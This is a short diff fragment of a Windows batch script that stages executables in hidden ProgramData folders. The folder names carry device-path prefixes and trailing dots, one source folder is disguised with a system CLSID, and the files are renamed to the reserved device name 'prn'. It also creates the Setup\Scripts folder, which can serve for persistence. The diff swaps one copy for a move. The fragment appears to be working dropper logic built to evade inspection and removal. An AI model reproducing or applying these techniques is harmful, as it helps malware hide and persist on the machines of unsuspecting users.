@@ -13,7 +13,7 @@ mkdir \\.\%ProgramData%\diaglogs..\
 mkdir %WINDIR%\Setup\Scripts
 
 copy /Y "%ProgramData%\LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\Index.exe" "\\.\%ProgramData%\logdata..\"
-copy /Y "%ProgramData%\LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\Index.exe" "\\.\%ProgramData%\logdata..\prn.exe"
+move /Y "%ProgramData%\LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\Index.exe" "\\.\%ProgramData%\logdata..\prn.exe"
 move /Y "%ProgramData%\LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\IconLib.dll" "\\.\%ProgramData%\logdata..\prn.ini"
 
 copy /Y "%ProgramData%\LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\Index.exe" "\\.\%ProgramData%\diaglogs..\
